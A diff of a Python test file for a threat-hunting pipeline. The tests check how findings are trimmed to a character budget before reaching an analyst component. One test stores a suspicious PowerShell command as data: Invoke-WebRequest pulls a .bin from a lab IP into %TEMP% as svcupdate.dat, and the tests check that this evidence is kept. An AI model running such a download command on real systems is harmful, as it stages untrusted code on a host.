@@ -1,27 +1,31 @@
-"""One size budget for a batch, water-filled across every task's domains (B9)."""
+"""One size budget for a batch, measured as the Analyst reads it (B9, B14, B51)."""
+
+import json
+from pathlib import Path
+
+import pytest
 
 from contracts import AnalystPayloadBatch, DomainRecord, HypothesisFindings, pack_for_analyst
+from contracts.reasoning import COMMANDS_FOOTER, NAMES_FOOTER, NARRATIVE_OMITTED, NO_ROWS_FOOTER
+
+ONEDRIVE = r"C:\Users\user\AppData\…cal\Microsoft\OneDrive\OneDrive.exe"
 
 
-def _task(task_id, narrative, summaries):
+def _sent(payloads) -> str:
+    """What `analyst.py:566` puts in the prompt: the batch, indented and ASCII-escaped."""
+    return json.dumps(AnalystPayloadBatch(batch_id="d6b48ef0-L2", payloads=payloads).model_dump(mode="json"), indent=2)
+
+
+def _task(task_id, narrative="short.", summaries=(), observations=(), facts=()):
     return HypothesisFindings(
         task_id=task_id, run_id="r", hypothesis_id=task_id, hypothesis="h",
-        findings=[DomainRecord(domain="endpoint", narrative=narrative, summaries=summaries)],
+        findings=[DomainRecord(domain="endpoint", narrative=narrative, summaries=list(summaries),
+                               observations=list(observations), facts=list(facts))],
     )
 
 
-def test_a_long_narrative_task_still_gets_summaries_and_the_batch_fits():
-    small = _task("t1", "short.", ["~ small#1 " + "x" * 80])
-    big = _task("t2", "y" * 3000, [f"~ processes#{i} " + "z" * 300 for i in range(1, 6)])
-    budget = 4260  # sized so one 300-char summary fits; +60 for the empty not_searched lists
-
-    payloads = pack_for_analyst([small, big], budget)
-
-    big_sent = payloads[1].findings[0].summaries
-    assert big_sent[0].startswith("~ processes#1")  # cited-first order kept
-    assert big_sent[-1].startswith("… ")  # and the rest are counted, not dropped silently
-    assert payloads[0].findings[0].summaries == small.findings[0].summaries  # the small need is met in full
-    assert len(AnalystPayloadBatch(batch_id="b", payloads=payloads).model_dump_json(indent=2)) <= budget + 200
+def _cmd(n, text):
+    return f"~ {n} row contributions, parent {ONEDRIVE}=1; command: {text}"
 
 
 def test_no_budget_sends_everything():
@@ -29,43 +33,142 @@ def test_no_budget_sends_everything():
     assert pack_for_analyst([big])[0].findings[0].summaries == big.findings[0].summaries
 
 
-def test_observations_give_way_when_narratives_fill_the_budget():
-    # c7dbf51d: narratives plus observations were 25.9k of 20.7k, so every summary went.
-    def task(task_id, n_obs):
-        return HypothesisFindings(
-            task_id=task_id, run_id="r", hypothesis_id=task_id, hypothesis="h",
-            findings=[DomainRecord(domain="endpoint", narrative="n" * 500,
-                                      observations=[f"obs {i} " + "o" * 200 for i in range(n_obs)])],
-        )
-    budget = 3000
+def test_a_task_with_many_summaries_still_leaves_the_small_need_whole():
+    small = _task("t1", summaries=["~ small#1 " + "x" * 80])
+    big = _task("t2", summaries=[f"~ processes#{i} " + "z" * 300 for i in range(1, 6)])
+    budget = len(_sent(pack_for_analyst([small, big]))) - 700
 
-    payloads = pack_for_analyst([task("t1", 2), task("t2", 20)], budget)
+    payloads = pack_for_analyst([small, big], budget)
 
-    assert [p.findings[0].narrative for p in payloads] == ["n" * 500] * 2  # narratives always cross
+    big_sent = payloads[1].findings[0].summaries
+    assert big_sent[0].startswith("~ processes#1")  # cited-first order kept
+    assert big_sent[-1].startswith("… ")  # the rest are counted, not dropped silently
+    assert payloads[0].findings[0].summaries == small.findings[0].summaries
+    assert len(_sent(payloads)) <= budget
+
+
+def test_narratives_go_first_longest_first():
+    # d6b48ef0: narratives crossed whole while the download in the code facts was cut.
+    t1 = _task("t1", "a" * 500, observations=["obs [processes#1]"])
+    t2 = _task("t2", "b" * 900, observations=["obs [processes#2]"])
+    budget = len(_sent(pack_for_analyst([t1, t2]))) - 300
+
+    payloads = pack_for_analyst([t1, t2], budget)
+
+    assert payloads[1].findings[0].narrative == NARRATIVE_OMITTED  # the longer one went
+    assert payloads[0].findings[0].narrative == "a" * 500  # and that was enough
+    assert [p.findings[0].observations for p in payloads] == [["obs [processes#1]"], ["obs [processes#2]"]]
+    assert len(_sent(payloads)) <= budget
+
+
+def test_observations_go_after_narratives_from_the_heaviest_domain_with_an_exact_count():
+    t1 = _task("t1", "n" * 500, observations=[f"obs {i} " + "o" * 50 for i in range(2)])
+    t2 = _task("t2", "n" * 500, observations=[f"obs {i} " + "o" * 200 for i in range(20)])
+    skeleton = len(_sent(pack_for_analyst([_task("t1", "n" * 500), _task("t2", "n" * 500)])))
+    budget = skeleton + 2000
+
+    payloads = pack_for_analyst([t1, t2], budget)
+
+    assert [p.findings[0].narrative for p in payloads] == [NARRATIVE_OMITTED] * 2
     assert len(payloads[0].findings[0].observations) == 2  # the smaller domain is left alone
     kept = payloads[1].findings[0].observations
-    assert kept[0].startswith("obs 0 ") and kept[-1].startswith("… ")  # tail cut, and counted
-    assert len(AnalystPayloadBatch(batch_id="b", payloads=payloads).model_dump_json(indent=2)) <= budget + 200
+    assert kept[0].startswith("obs 0 ") and kept[-1].startswith("… ")
+    assert kept[-1].startswith(f"… {20 - (len(kept) - 1)} observations omitted")
+    assert len(_sent(payloads)) <= budget
 
 
-def test_code_facts_give_way_before_observations():
-    # 874ab334: the footers were 62-73% of the narratives, so 0 of 42 observations
-    # crossed and the batch still shipped 7k over (B14).
-    from contracts.reasoning import COMMANDS_FOOTER, NAMES_FOOTER, NO_ROWS_FOOTER
-
-    facts = [NAMES_FOOTER, "~ name line", NO_ROWS_FOOTER, *(f"~ empty {i} " + "e" * 300 for i in range(8)),
-             COMMANDS_FOOTER, *(f"~ cmd {i} " + "c" * 300 for i in range(4))]
-    task = HypothesisFindings(
-        task_id="t1", run_id="r", hypothesis_id="t1", hypothesis="h",
-        findings=[DomainRecord(domain="endpoint", narrative="n" * 200,
-                               observations=[f"obs {i} " + "o" * 100 for i in range(5)], facts=facts)],
-    )
-    budget = 2900
+def test_empty_searches_go_before_command_lines_and_commands_shorten_before_any_is_dropped():
+    download = "powershell.exe -C \"$uri = 'http://192.168.40.211/update/win-agent-2.4.1.bin';Invoke-WebRequest -Uri $uri -OutFile $env:TEMP\\svcupdate.dat\" " + "p" * 300
+    facts = [NAMES_FOOTER, f"~ \"onedrive.exe\" in these rows is 1 file: {ONEDRIVE}=49",
+             NO_ROWS_FOOTER, *(f"~ empty {i} " + "e" * 300 for i in range(6)),
+             COMMANDS_FOOTER, *(_cmd(8 + i, f"cmd {i} " + "c" * 380) for i in range(3)), _cmd(16, download)]
+    task = _task("t1", "n" * 50, facts=facts)
+    full = len(_sent(pack_for_analyst([task])))
+    budget = full - 2400  # the empty searches and then the shortening, not a dropped command
 
     sent = pack_for_analyst([task], budget)[0].findings[0]
 
-    assert len(sent.observations) == 5  # every observation crossed
-    assert "~ name line" in sent.facts  # names are kept
-    assert not any(f.startswith("~ empty") for f in sent.facts)  # empty searches went first
-    assert NO_ROWS_FOOTER in sent.facts and any("omitted for size" in f for f in sent.facts)
-    assert len(AnalystPayloadBatch(batch_id="b", payloads=[pack_for_analyst([task], budget)[0]]).model_dump_json(indent=2)) <= budget + 200
+    assert not any(f.startswith("~ empty") for f in sent.facts)
+    assert NO_ROWS_FOOTER in sent.facts  # the header stays, with its count
+    assert "~ … 6 lines omitted for size (full in findings.json)" in sent.facts
+    commands = [f for f in sent.facts if "; command: " in f]
+    assert len(commands) == 4  # all kept, shortened
+    assert all(len(c.split("; command: ", 1)[1]) <= 201 for c in commands)
+    assert "win-agent-2.4.1.bin" in commands[-1] and "svcupdate.dat" in commands[-1] and ONEDRIVE in commands[-1]
+    assert len(_sent([pack_for_analyst([task], budget)[0]])) <= budget
+
+
+def test_a_command_another_task_also_holds_goes_before_any_other_line_its_lesser_copy_first():
+    # d6b48ef0: T6's three command lines were all T3's, at 2 contributions against T3's 16.
+    t3 = _task("t3", "n" * 20, facts=[COMMANDS_FOOTER, _cmd(8, "uptime " + "u" * 150), _cmd(16, "download " + "d" * 150)])
+    t6 = _task("t6", "n" * 20, facts=[COMMANDS_FOOTER, _cmd(2, "download " + "d" * 150)])
+    budget = len(_sent(pack_for_analyst([t3, t6]))) - 150
+
+    payloads = pack_for_analyst([t3, t6], budget)
+
+    assert len([f for f in payloads[0].findings[0].facts if "; command: " in f]) == 2
+    assert COMMANDS_FOOTER not in payloads[1].findings[0].facts  # all T3's: said there, no empty block
+    assert len(_sent(payloads)) <= budget
+
+
+def test_the_fallback_drops_the_least_repeated_line_from_the_domain_holding_the_most_commands():
+    few = _task("t1", "n" * 20, facts=[COMMANDS_FOOTER, *(_cmd(1, f"few {i} " + "f" * 150) for i in range(2))])
+    many = _task("t2", "n" * 20, facts=[COMMANDS_FOOTER, _cmd(3, "many a " + "m" * 150), _cmd(40, "many b " + "m" * 150),
+                                       _cmd(2, "many c " + "m" * 150), _cmd(5, "many d " + "m" * 150)])
+    budget = len(_sent(pack_for_analyst([few, many]))) - 150  # one line's worth, net of its note
+
+    payloads = pack_for_analyst([few, many], budget)
+
+    assert len([f for f in payloads[0].findings[0].facts if "; command: " in f]) == 2
+    kept = [f for f in payloads[1].findings[0].facts if "; command: " in f]
+    # A beacon repeats by design: the 2 went first, the 40 stays.
+    assert [f.split("; command: ")[1][:6] for f in kept] == ["many a", "many b", "many d"]
+    assert any(f.startswith("~ … 1 command lines omitted") for f in payloads[1].findings[0].facts)
+    assert len(_sent(payloads)) <= budget
+
+
+def test_the_batch_never_ships_over_budget():
+    # reasoning.py:893 warned and shipped: d6b48ef0's batch went out at 18,088 of 13,272.
+    names = [NAMES_FOOTER, *(f"~ \"f{i}.exe\" in these rows is 1 file: {ONEDRIVE}\\f{i}.exe=1" for i in range(60))]
+    tasks = [_task(f"t{i}", "n" * 400, summaries=["~ s#1 " + "s" * 200], facts=names) for i in range(3)]
+    budget = 6000
+
+    assert len(_sent(pack_for_analyst(tasks, budget))) <= budget
+
+
+HANDOFF_CHAR_BUDGET = 13_272  # smartops.subagent_analysts.packing.HANDOFF_CHAR_BUDGET at d6b48ef0
+FIXTURE = Path(__file__).parent / "fixtures" / "d6b48ef0_L2.json"
+# The commands the Analyst never saw on d6b48ef0 L2 (sanitised: the user, host and lab range are renamed).
+DOWNLOAD = ("win-agent-2.4.1.bin", "svcupdate", "Invoke-WebRequest", r"OneDrive\OneDrive.exe")
+
+
+def test_d6b48ef0_keeps_the_download_within_budget():
+    # The batch went out at 18,088 of 13,272 chars with no download in it (B51).
+    tasks = [HypothesisFindings.model_validate(t) for t in json.loads(FIXTURE.read_text(encoding="utf-8"))]
+
+    payloads = pack_for_analyst(tasks, HANDOFF_CHAR_BUDGET)
+
+    assert len(_sent(payloads)) <= HANDOFF_CHAR_BUDGET
+    # In T3's own facts: T6's copy only crossed by max() tie-breaking among its 2-contribution lines.
+    t3 = next(p for p in payloads if p.task_id.endswith("-T3"))
+    assert any(all(s in line for s in DOWNLOAD) for f in t3.findings for line in f.facts)
+
+
+def test_a_domain_with_nothing_to_say_is_not_sent_but_named_in_one_line():
+    # d6b48ef0: 14 of 21 domains crossed as empty blocks, ~2.2k of the budget (B51).
+    from contracts import DomainGap, RetrievalSummary
+
+    task = HypothesisFindings(
+        task_id="t1", run_id="r", hypothesis_id="t1", hypothesis="h",
+        findings=[DomainRecord(domain="identity"), DomainRecord(domain="network"),
+                  DomainRecord(domain="endpoint", narrative="PowerShell ran.")],
+    )
+    sent = pack_for_analyst([task])[0]
+
+    assert [f.domain for f in sent.findings] == ["endpoint"]
+    assert sent.no_rows == ["No rows in this task's results belong to identity, network."]
+
+    # A domain left empty because its source was down is already said by not_searched.
+    down = DomainGap(family="siem", reason="no_tools_resolved", served_domains=["network"], unanswered_domains=["network"])
+    sent = pack_for_analyst([task.model_copy(update={"retrieval": RetrievalSummary(gaps=[down])})])[0]
+    assert sent.no_rows == ["No rows in this task's results belong to identity."]
